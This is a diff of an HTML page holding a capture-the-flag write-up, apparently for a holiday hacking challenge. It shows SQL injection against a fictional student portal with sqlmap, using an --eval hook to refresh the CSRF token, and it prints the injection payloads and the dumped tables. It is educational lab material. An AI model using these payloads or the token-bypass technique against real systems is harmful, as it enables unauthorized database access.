@@ -15,51 +15,51 @@
 <p>Looking at the website we see 2 pages that look like they use SQL: You can submit an application, <code>/apply.php</code>, or you can check the status, <code>check.php</code>. Thinking about how these work, applying probably runs some INSERT statement, whereas check is probably a SELECT statement. Since injecting into SELECT statements is more common, it's also easier to do with a lot of tools. so we'll focus on this form.</p>
 <p>First we need to know how the form works, so we can open burp, set the proxy, etc. and submit the form with some example data.</p>
 <p>We see 2 requests after we submit the form:</p>
-<div class="codehilite"><pre><span></span><span class="o">&gt;</span> <span class="nt">GET</span> <span class="o">/</span><span class="nt">validator</span><span class="p">.</span><span class="nc">php</span> <span class="nt">HTTP</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">1</span>
-<span class="o">&gt;</span> <span class="nt">Host</span><span class="o">:</span> <span class="nt">studentportal</span><span class="p">.</span><span class="nc">elfu</span><span class="p">.</span><span class="nc">org</span>
-<span class="o">&gt;</span> <span class="nt">Accept</span><span class="o">:</span> <span class="o">*</span><span class="c">/*</span>
-<span class="c">&gt; Referer: https://studentportal.elfu.org/check.php</span>
+<div class="codehilite"><pre><span></span>&gt; GET /validator.php HTTP/1.1
+&gt; Host: studentportal.elfu.org
+&gt; Accept: */*
+&gt; Referer: https://studentportal.elfu.org/check.php
 
-<span class="c">&lt; HTTP/1.1 200 OK</span>
-<span class="c">&lt; Content-Type: text/html; charset=UTF-8</span>
-<span class="c">&lt; X-Powered-By: PHP/7.2.1</span>
-<span class="c">&lt; </span>
-<span class="c">&lt; MTAwOTU3NjU3MjE2MTU3NzQ2MzM5NDEwMDk1NzY1Ny4yMTY=_MTI5MjI1ODAxMjM2NDgzMjMwNjQ1MDMwLjkxMg==</span>
-<span class="c">&lt; </span>
+&lt; HTTP/1.1 200 OK
+&lt; Content-Type: text/html; charset=UTF-8
+&lt; X-Powered-By: PHP/7.2.1
+&lt; 
+&lt; MTAwOTU3NjU3MjE2MTU3NzQ2MzM5NDEwMDk1NzY1Ny4yMTY=_MTI5MjI1ODAxMjM2NDgzMjMwNjQ1MDMwLjkxMg==
+&lt; 
 
-<span class="c">&gt; GET /application-check.php?elfmail=krampus%40elfu.ac&amp;token=MTAwOTU3NjU3MjE2MTU3NzQ2MzM5NDEwMDk1NzY1Ny4yMTY%3D_MTI5MjI1ODAxMjM2NDgzMjMwNjQ1MDMwLjkxMg%3D%3D HTTP/1.1</span>
-<span class="c">&gt; Host: studentportal.elfu.org</span>
-<span class="c">&gt; Accept: */</span><span class="o">*</span>
-<span class="o">&gt;</span> <span class="nt">Referer</span><span class="o">:</span> <span class="nt">https</span><span class="o">://</span><span class="nt">studentportal</span><span class="p">.</span><span class="nc">elfu</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">check</span><span class="p">.</span><span class="nc">php</span>
+&gt; GET /application-check.php?elfmail=krampus%40elfu.ac&amp;token=MTAwOTU3NjU3MjE2MTU3NzQ2MzM5NDEwMDk1NzY1Ny4yMTY%3D_MTI5MjI1ODAxMjM2NDgzMjMwNjQ1MDMwLjkxMg%3D%3D HTTP/1.1
+&gt; Host: studentportal.elfu.org
+&gt; Accept: */*
+&gt; Referer: https://studentportal.elfu.org/check.php
 
-<span class="o">&lt;</span> <span class="cp">[</span><span class="nx">...</span><span class="cp">]</span>
+&lt; [...]
 </pre></div>
 
 
 <p>(trimmed)</p>
 <p>The actual form goes in the second request as GET parameter <code>elfmail</code>. We also have a <code>token</code> value that's just the response from <code>validator.php</code>. If we try to reuse this for another request we get the message 'Invalid or expired token!', so this is some CSRF token that we need to populate each request.</p>
 <p>Let's run sqlmap against it. A start would be:</p>
-<div class="codehilite"><pre><span></span><span class="err">sqlmap -u &#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39;</span>
+<div class="codehilite"><pre><span></span>sqlmap -u &#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39;
 </pre></div>
 
 
 <p>But of course we need to update the CSRF token. SQLMap has built in parameters <code>--csrf-token</code> and <code>--csrf-url</code> for doing this, so it seems like we should be able to do this:</p>
-<div class="codehilite"><pre><span></span><span class="err">sqlmap -u &#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39; --csrf-token &#39;token&#39; --csrf-url &#39;https://studentportal.elfu.org/validator.php&#39;</span>
+<div class="codehilite"><pre><span></span>sqlmap -u &#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39; --csrf-token &#39;token&#39; --csrf-url &#39;https://studentportal.elfu.org/validator.php&#39;
 </pre></div>
 
 
 <p>But we get this error:</p>
-<div class="codehilite"><pre><span></span><span class="o">[</span><span class="n">..:..:..</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">CRITICAL</span><span class="o">]</span><span class="w"> </span><span class="n">anti</span><span class="o">-</span><span class="n">CSRF</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="s1">&#39;token&#39;</span><span class="w"> </span><span class="n">can</span><span class="s1">&#39;t be found at &#39;</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">studentportal</span><span class="p">.</span><span class="n">elfu</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">validator</span><span class="p">.</span><span class="n">php</span><span class="err">&#39;</span><span class="w"></span>
+<div class="codehilite"><pre><span></span>[..:..:..] [CRITICAL] anti-CSRF token &#39;token&#39; can&#39;t be found at &#39;https://studentportal.elfu.org/validator.php&#39;
 </pre></div>
 
 
 <p>So it seems like it's looking for the token to be as an <code>&lt;input&gt;</code> or as a URL param. This isn't going to work, so we'll have to manipulate the token value some other way. From the SQLMap docs:</p>
-<div class="codehilite"><pre><span></span><span class="n">Option</span><span class="p">:</span> <span class="o">--</span><span class="nb">eval</span>
+<div class="codehilite"><pre><span></span>Option: --eval
 
-<span class="n">In</span> <span class="n">case</span> <span class="n">that</span> <span class="n">user</span> <span class="n">wants</span> <span class="n">to</span> <span class="n">change</span> <span class="p">(</span><span class="ow">or</span> <span class="n">add</span> <span class="n">new</span><span class="p">)</span> <span class="n">parameter</span> <span class="n">values</span><span class="p">,</span> <span class="n">most</span> <span class="n">probably</span> <span class="n">because</span> <span class="n">of</span> <span class="n">some</span> <span class="n">known</span> <span class="n">dependency</span><span class="p">,</span> <span class="n">he</span> <span class="n">can</span> <span class="n">provide</span> <span class="n">to</span> <span class="n">sqlmap</span> <span class="n">a</span> <span class="n">custom</span> <span class="n">python</span> <span class="n">code</span> <span class="k">with</span> <span class="n">option</span> <span class="o">--</span><span class="nb">eval</span> <span class="n">that</span> <span class="n">will</span> <span class="n">be</span> <span class="n">evaluated</span> <span class="n">just</span> <span class="n">before</span> <span class="n">each</span> <span class="n">request</span><span class="o">.</span>
+In case that user wants to change (or add new) parameter values, most probably because of some known dependency, he can provide to sqlmap a custom python code with option --eval that will be evaluated just before each request.
 
-<span class="err">$</span> <span class="n">python</span> <span class="n">sqlmap</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s2">&quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b9238</span><span class="se">\</span>
-<span class="s2">20dcc509a6f75849b&quot;</span> <span class="o">--</span><span class="nb">eval</span><span class="o">=</span><span class="s2">&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span>
+$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b9238\
+20dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;
 </pre></div>
 
 
@@ -70,90 +70,90 @@
 
 
 <p>Then set that as the eval function:</p>
-<div class="codehilite"><pre><span></span><span class="err">$</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39;</span> <span class="o">--</span><span class="nb">eval</span> <span class="s1">&#39;import requests; token = requests.get(&#39;</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">studentportal</span><span class="o">.</span><span class="n">elfu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">validator</span><span class="o">.</span><span class="n">php</span><span class="s1">&#39;).text&#39;</span>
+<div class="codehilite"><pre><span></span>$ sqlmap -u &#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39; --eval &#39;import requests; token = requests.get(&#39;https://studentportal.elfu.org/validator.php&#39;).text&#39;
 
-<span class="p">[</span><span class="o">...</span><span class="p">]</span>
+[...]
 
-<span class="n">sqlmap</span> <span class="n">identified</span> <span class="n">the</span> <span class="n">following</span> <span class="n">injection</span> <span class="n">point</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">with</span> <span class="n">a</span> <span class="n">total</span> <span class="n">of</span> <span class="mi">189</span> <span class="n">HTTP</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">requests</span><span class="p">:</span>
-<span class="o">---</span>
-<span class="n">Parameter</span><span class="p">:</span> <span class="n">elfmail</span> <span class="p">(</span><span class="n">GET</span><span class="p">)</span>
-    <span class="n">Type</span><span class="p">:</span> <span class="n">boolean</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
-    <span class="n">Title</span><span class="p">:</span> <span class="n">AND</span> <span class="n">boolean</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span> <span class="o">-</span> <span class="n">WHERE</span> <span class="ow">or</span> <span class="n">HAVING</span> <span class="n">clause</span>
-    <span class="n">Payload</span><span class="p">:</span> <span class="n">elfmail</span><span class="o">=</span><span class="n">AAA</span><span class="s1">&#39; AND 3693=3693 AND &#39;</span><span class="n">ObJp</span><span class="s1">&#39;=&#39;</span><span class="n">ObJp</span><span class="o">&amp;</span><span class="n">token</span><span class="o">=</span><span class="n">AAA</span>
+sqlmap identified the following injection point(s) with a total of 189 HTTP(s) requests:
+---
+Parameter: elfmail (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: elfmail=AAA&#39; AND 3693=3693 AND &#39;ObJp&#39;=&#39;ObJp&amp;token=AAA
 
-    <span class="n">Type</span><span class="p">:</span> <span class="n">error</span><span class="o">-</span><span class="n">based</span>
-    <span class="n">Title</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mf">5.0</span> <span class="n">AND</span> <span class="n">error</span><span class="o">-</span><span class="n">based</span> <span class="o">-</span> <span class="n">WHERE</span><span class="p">,</span> <span class="n">HAVING</span><span class="p">,</span> <span class="n">ORDER</span> <span class="n">BY</span> <span class="ow">or</span> <span class="n">GROUP</span> <span class="n">BY</span> <span class="n">clause</span> <span class="p">(</span><span class="n">FLOOR</span><span class="p">)</span>
-    <span class="n">Payload</span><span class="p">:</span> <span class="n">elfmail</span><span class="o">=</span><span class="n">AAA</span><span class="s1">&#39; AND (SELECT 4447 FROM(SELECT COUNT(*),CONCAT(0x716b627871,(SELECT (ELT(4447=4447,1))),0x7170707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#39;</span><span class="n">ByHL</span><span class="s1">&#39;=&#39;</span><span class="n">ByHL</span><span class="o">&amp;</span><span class="n">token</span><span class="o">=</span><span class="n">AAA</span>
+    Type: error-based
+    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: elfmail=AAA&#39; AND (SELECT 4447 FROM(SELECT COUNT(*),CONCAT(0x716b627871,(SELECT (ELT(4447=4447,1))),0x7170707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#39;ByHL&#39;=&#39;ByHL&amp;token=AAA
 
-    <span class="n">Type</span><span class="p">:</span> <span class="n">time</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
-    <span class="n">Title</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mf">5.0</span><span class="o">.</span><span class="mi">12</span> <span class="n">AND</span> <span class="n">time</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span> <span class="p">(</span><span class="n">query</span> <span class="n">SLEEP</span><span class="p">)</span>
-    <span class="n">Payload</span><span class="p">:</span> <span class="n">elfmail</span><span class="o">=</span><span class="n">AAA</span><span class="s1">&#39; AND (SELECT 3959 FROM (SELECT(SLEEP(5)))cRnI) AND &#39;</span><span class="n">gKPu</span><span class="s1">&#39;=&#39;</span><span class="n">gKPu</span><span class="o">&amp;</span><span class="n">token</span><span class="o">=</span><span class="n">AAA</span>
-<span class="o">---</span>
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: elfmail=AAA&#39; AND (SELECT 3959 FROM (SELECT(SLEEP(5)))cRnI) AND &#39;gKPu&#39;=&#39;gKPu&amp;token=AAA
+---
 </pre></div>
 
 
 <p>Now we can start looking at the databaes. We can enumerate the following tables:</p>
-<div class="codehilite"><pre><span></span><span class="err">$</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39;</span> <span class="o">--</span><span class="nb">eval</span> <span class="s1">&#39;import requests; token = requests.get(&#39;</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">studentportal</span><span class="o">.</span><span class="n">elfu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">validator</span><span class="o">.</span><span class="n">php</span><span class="s1">&#39;).text&#39;</span> <span class="o">--</span><span class="n">tables</span>
+<div class="codehilite"><pre><span></span>$ sqlmap -u &#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39; --eval &#39;import requests; token = requests.get(&#39;https://studentportal.elfu.org/validator.php&#39;).text&#39; --tables
 
-<span class="p">[</span><span class="o">..</span><span class="p">:</span><span class="o">..</span><span class="p">:</span><span class="o">..</span><span class="p">]</span> <span class="p">[</span><span class="n">WARNING</span><span class="p">]</span> <span class="n">user</span> <span class="n">aborted</span> <span class="n">during</span> <span class="n">enumeration</span><span class="o">.</span> <span class="n">sqlmap</span> <span class="n">will</span> <span class="n">display</span> <span class="n">partial</span> <span class="n">output</span>
-<span class="n">Database</span><span class="p">:</span> <span class="n">elfu</span>
-<span class="p">[</span><span class="mi">3</span> <span class="n">tables</span><span class="p">]</span>
-<span class="o">+---------------------------------------+</span>
-<span class="o">|</span> <span class="n">applications</span>                          <span class="o">|</span>
-<span class="o">|</span> <span class="n">krampus</span>                               <span class="o">|</span>
-<span class="o">|</span> <span class="n">students</span>                              <span class="o">|</span>
-<span class="o">+---------------------------------------+</span>
+[..:..:..] [WARNING] user aborted during enumeration. sqlmap will display partial output
+Database: elfu
+[3 tables]
++---------------------------------------+
+| applications                          |
+| krampus                               |
+| students                              |
++---------------------------------------+
 
-<span class="n">Database</span><span class="p">:</span> <span class="n">information_schema</span>
-<span class="p">[</span><span class="mi">8</span> <span class="n">tables</span><span class="p">]</span>
-<span class="o">+---------------------------------------+</span>
-<span class="o">|</span> <span class="n">ALL_PLUGINS</span>                           <span class="o">|</span>
-<span class="o">|</span> <span class="n">APPLICABLE_ROLES</span>                      <span class="o">|</span>
-<span class="o">|</span> <span class="n">CHARACTER_SETS</span>                        <span class="o">|</span>
-<span class="o">|</span> <span class="n">COLLATIONS</span>                            <span class="o">|</span>
-<span class="o">|</span> <span class="n">COLLATION_CHARACTER_SET_APPLICABILITY</span> <span class="o">|</span>
-<span class="o">|</span> <span class="n">COLUMNS</span>                               <span class="o">|</span>
-<span class="o">|</span> <span class="n">COLUMN_PRIVILEGES</span>                     <span class="o">|</span>
-<span class="o">|</span> <span class="n">ENABLED_ROLES</span>                         <span class="o">|</span>
-<span class="o">+---------------------------------------+</span>
+Database: information_schema
+[8 tables]
++---------------------------------------+
+| ALL_PLUGINS                           |
+| APPLICABLE_ROLES                      |
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENABLED_ROLES                         |
++---------------------------------------+
 </pre></div>
 
 
 <p>Let's dump the contents of the <code>krampus</code> table:</p>
-<div class="codehilite"><pre><span></span><span class="err">$</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39;</span> <span class="o">--</span><span class="nb">eval</span> <span class="s1">&#39;import requests; token = requests.get(&#39;</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">studentportal</span><span class="o">.</span><span class="n">elfu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">validator</span><span class="o">.</span><span class="n">php</span><span class="s1">&#39;).text&#39;</span> <span class="o">-</span><span class="n">T</span> <span class="n">krampus</span> <span class="o">--</span><span class="n">dump</span>
+<div class="codehilite"><pre><span></span>$ sqlmap -u &#39;https://studentportal.elfu.org/application-check.php?elfmail=AAA&amp;token=BBB&#39; --eval &#39;import requests; token = requests.get(&#39;https://studentportal.elfu.org/validator.php&#39;).text&#39; -T krampus --dump
 
-<span class="n">Database</span><span class="p">:</span> <span class="n">elfu</span>
-<span class="n">Table</span><span class="p">:</span> <span class="n">krampus</span>
-<span class="p">[</span><span class="mi">6</span> <span class="n">entries</span><span class="p">]</span>
-<span class="o">+----+-----------------------+</span>
-<span class="o">|</span> <span class="nb">id</span> <span class="o">|</span> <span class="n">path</span>                  <span class="o">|</span>
-<span class="o">+----+-----------------------+</span>
-<span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="o">/</span><span class="n">krampus</span><span class="o">/</span><span class="mi">0</span><span class="n">f5f510e</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span>
-<span class="o">|</span> <span class="mi">2</span>  <span class="o">|</span> <span class="o">/</span><span class="n">krampus</span><span class="o">/</span><span class="mi">1</span><span class="n">cc7e121</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span>
-<span class="o">|</span> <span class="mi">3</span>  <span class="o">|</span> <span class="o">/</span><span class="n">krampus</span><span class="o">/</span><span class="mi">439</span><span class="n">f15e6</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span>
-<span class="o">|</span> <span class="mi">4</span>  <span class="o">|</span> <span class="o">/</span><span class="n">krampus</span><span class="o">/</span><span class="mi">667</span><span class="n">d6896</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span>
-<span class="o">|</span> <span class="mi">5</span>  <span class="o">|</span> <span class="o">/</span><span class="n">krampus</span><span class="o">/</span><span class="n">adb798ca</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span>
-<span class="o">|</span> <span class="mi">6</span>  <span class="o">|</span> <span class="o">/</span><span class="n">krampus</span><span class="o">/</span><span class="n">ba417715</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span>
-<span class="o">+----+-----------------------+</span>
+Database: elfu
+Table: krampus
+[6 entries]
++----+-----------------------+
+| id | path                  |
++----+-----------------------+
+| 1  | /krampus/0f5f510e.png |
+| 2  | /krampus/1cc7e121.png |
+| 3  | /krampus/439f15e6.png |
+| 4  | /krampus/667d6896.png |
+| 5  | /krampus/adb798ca.png |
+| 6  | /krampus/ba417715.png |
++----+-----------------------+
 </pre></div>
 
 
 <p>Each of these paths is an image on the server, all of which seem to be a fragment of paper. We can piece these together and see the final message:</p>
-<div class="codehilite"><pre><span></span><span class="k">From</span> <span class="n">the</span> <span class="n">desk</span> <span class="k">of</span> <span class="p">....</span>
-<span class="nb">Date</span><span class="p">:</span> <span class="n">August</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">20</span><span class="p">...</span>
+<div class="codehilite"><pre><span></span>From the desk of ....
+Date: August 23, 20...
 
-<span class="n">Memo</span> <span class="k">to</span> <span class="k">Self</span><span class="p">:</span>
+Memo to Self:
 
-<span class="n">Finally</span><span class="o">!</span> <span class="n">I</span><span class="s1">&#39;ve figured out how to destroy Christmas!</span>
-<span class="s1">Santa has a brand new, cutting edge sleigh guidance technology, called the Super Sled-o-matic.</span>
+Finally! I&#39;ve figured out how to destroy Christmas!
+Santa has a brand new, cutting edge sleigh guidance technology, called the Super Sled-o-matic.
 
-<span class="s1">I&#39;</span><span class="n">ve</span> <span class="n">figured</span> <span class="k">out</span> <span class="n">a</span> <span class="n">way</span> <span class="k">to</span> <span class="n">poison</span> <span class="n">the</span> <span class="k">data</span> <span class="n">going</span> <span class="k">into</span> <span class="n">the</span> <span class="k">system</span> <span class="n">so</span> <span class="n">that</span> <span class="n">it</span> <span class="n">will</span> <span class="n">divert</span> <span class="n">Santa</span><span class="s1">&#39;s sled on Christmas Eve!</span>
+I&#39;ve figured out a way to poison the data going into the system so that it will divert Santa&#39;s sled on Christmas Eve!
 
-<span class="s1">Santa will be unable to make the trip and the holiday season will be destroyed! Santa&#39;</span><span class="n">s</span> <span class="n">own</span> <span class="n">technology</span> <span class="n">will</span> <span class="n">undermine</span> <span class="n">him</span><span class="o">!</span>
+Santa will be unable to make the trip and the holiday season will be destroyed! Santa&#39;s own technology will undermine him!
 
-<span class="n">That</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">what</span> <span class="n">they</span> <span class="n">deserve</span> <span class="k">for</span> <span class="k">not</span> <span class="n">listening</span> <span class="k">to</span> <span class="n">my</span> <span class="n">suggestions</span> <span class="k">for</span> <span class="n">supporting</span> <span class="n">other</span> <span class="n">holiday</span> <span class="n">characters</span><span class="o">!</span>
+That&#39;s what they deserve for not listening to my suggestions for supporting other holiday characters!
 
-<span class="n">Bwahahahahaha</span><span class="o">!</span>
+Bwahahahahaha!
 </pre></div>
 		</main>
 
